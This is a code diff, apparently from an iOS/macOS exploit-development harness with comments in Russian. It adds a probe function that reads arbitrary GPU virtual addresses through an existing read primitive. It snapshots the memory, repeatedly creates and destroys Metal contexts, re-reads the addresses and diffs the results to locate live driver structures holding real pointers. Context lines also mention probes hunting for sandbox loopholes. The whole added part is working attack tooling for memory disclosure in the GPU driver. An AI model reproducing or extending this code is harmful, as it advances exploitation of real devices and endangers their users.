@@ -45019,6 +45019,112 @@ static void p_bq93(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq94 — v254: churn-diff охота на ЖИВЫЕ VRAM-регионы (§245-next).
+// Урок §245: идентичность контента между проходами = константа (rec-таблица).
+// Дискриминация живого: проход A → churn (10× создание/уничтожение
+// Metal-контекстов: очереди+буферы+blit-commit в autoreleasepool) →
+// проход B → diff. Изменившиеся чанки = runtime-структуры драйвера
+// (аллокатор-трекинг, per-контекст таблицы — там настоящие указатели).
+// FATAL-VA §83 (0x100_00004000) исключён из свипа. Свои probe-паттерны
+// (0x41/0x77/0x61) при интерпретации игнорировать (урок хвоста §245).
+static void p_bq94(void) {
+    LOG("[bq94] v254: churn-diff охота на живые VRAM-регионы (§245-next)");
+    fsync(fileno(stderr));
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[bq94] no MTLDevice"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    if (!mq) { LOG("[bq94] no queue"); return; }
+    long k41 = 0, knz = 0;
+    if (bq92_probe(mq, dev, 2, 0, NULL, 0, &k41, &knz) < 0 || !knz) {
+        LOG("[bq94] K0 CONTROL FAILED");
+        return;
+    }
+    LOG("[bq94] K0 OK (Bnz %ld)", knz);
+    fsync(fileno(stderr));
+
+    // Список VA: 0x100_00000000..0x100_00100000 шаг 0x8000, FATAL-VA пропущен
+    uint64_t vas[40]; int nv = 0;
+    for (uint64_t va = 0x10000000000ULL; va < 0x10000100000ULL && nv < 40; va += 0x8000) {
+        if (va == 0x10000004000ULL) continue;          // FATAL-read (§83)
+        vas[nv++] = va;
+    }
+    LOG("[bq94] свип: %d VA (шаг 0x8000, 0x100_00004000 исключён)", nv);
+    uint8_t *snapA = must_map((size_t)nv * 0x1000);
+    uint8_t *snapB = must_map((size_t)nv * 0x1000);
+
+    // === Проход A ===
+    for (int i = 0; i < nv; i++) {
+        long cnz = 0, c41 = 0;
+        memset(snapA + (long)i * 0x1000, 0, 0x1000);
+        bq92_probe(mq, dev, 0, vas[i], snapA + (long)i * 0x1000, 0x1000, &c41, &cnz);
+        long np = 0;
+        uint64_t mn = ~0ULL, mx = 0;
+        for (int q = 0; q < 0x200; q++) {
+            uint64_t v = *(uint64_t *)(snapA + (long)i * 0x1000 + q * 8);
+            if (v) { np++; if (v < mn) mn = v; if (v > mx) mx = v; }
+        }
+        LOG("[bq94] A %#llx: nz-u64 %ld/512 range [%#llx..%#llx]",
+            vas[i], np, np ? mn : 0, np ? mx : 0);
+        fsync(fileno(stderr));
+    }
+
+    // === Churn: 10 циклов создания/уничтожения Metal-контекстов ===
+    LOG("[bq94] churn: 10 × (queue + 2×0x20000-буферы + blit-commit + release)");
+    for (int it = 0; it < 10; it++) {
+        @autoreleasepool {
+            id<MTLCommandQueue> q2 = [dev newCommandQueue];
+            id<MTLBuffer> b1 = [dev newBufferWithLength:0x20000 options:MTLResourceStorageModeShared];
+            id<MTLBuffer> b2 = [dev newBufferWithLength:0x20000 options:MTLResourceStorageModeShared];
+            if (b1) memset([b1 contents], 0x61, 0x20000);
+            if (q2 && b1 && b2) {
+                id<MTLCommandBuffer> cb = [q2 commandBuffer];
+                id<MTLBlitCommandEncoder> en = [cb blitCommandEncoder];
+                [en copyFromBuffer:b1 sourceOffset:0 toBuffer:b2 destinationOffset:0 size:0x20000];
+                [en endEncoding];
+                @try { [cb commit]; [cb waitUntilCompleted]; } @catch (NSException *ex) {}
+            }
+        }
+        usleep(100000);
+    }
+    LOG("[bq94] churn завершён");
+    fsync(fileno(stderr));
+
+    // === Проход B + diff ===
+    long nchanged = 0;
+    for (int i = 0; i < nv; i++) {
+        long cnz = 0, c41 = 0;
+        memset(snapB + (long)i * 0x1000, 0, 0x1000);
+        bq92_probe(mq, dev, 0, vas[i], snapB + (long)i * 0x1000, 0x1000, &c41, &cnz);
+        long nd = 0, first = -1;
+        for (int q = 0; q < 0x200; q++) {
+            uint64_t a = *(uint64_t *)(snapA + (long)i * 0x1000 + q * 8);
+            uint64_t b = *(uint64_t *)(snapB + (long)i * 0x1000 + q * 8);
+            if (a != b) { nd++; if (first < 0) first = q; }
+        }
+        if (nd) {
+            nchanged++;
+            LOG("[bq94] *** DIFF %#llx: %ld/512 u64 изменены, первый @+%#lx",
+                vas[i], nd, first * 8);
+            long base = first * 8 - 0x20;
+            if (base < 0) base = 0;
+            hexdump("[bq94]   diff-A", snapA + (long)i * 0x1000 + base, 0x60);
+            hexdump("[bq94]   diff-B", snapB + (long)i * 0x1000 + base, 0x60);
+            // диапазон НОВЫХ значений (указатели?)
+            uint64_t mn = ~0ULL, mx = 0;
+            long np = 0;
+            for (int q = 0; q < 0x200; q++) {
+                uint64_t a = *(uint64_t *)(snapA + (long)i * 0x1000 + q * 8);
+                uint64_t b = *(uint64_t *)(snapB + (long)i * 0x1000 + q * 8);
+                if (a != b && b) { np++; if (b < mn) mn = b; if (b > mx) mx = b; }
+            }
+            LOG("[bq94]   новые-значения: %ld шт, range [%#llx..%#llx]", np, np ? mn : 0, np ? mx : 0);
+        }
+        fsync(fileno(stderr));
+    }
+    LOG("[bq94] ИТОГ: изменённых чанков %ld из %d — это ЖИВЫЕ runtime-регионы (кандидаты)", nchanged, nv);
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -53626,6 +53732,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ91")) { p_bq91(); LOG("[probe13] bq91-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ92")) { p_bq92(); LOG("[probe13] bq92-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ93")) { p_bq93(); LOG("[probe13] bq93-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ94")) { p_bq94(); LOG("[probe13] bq94-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
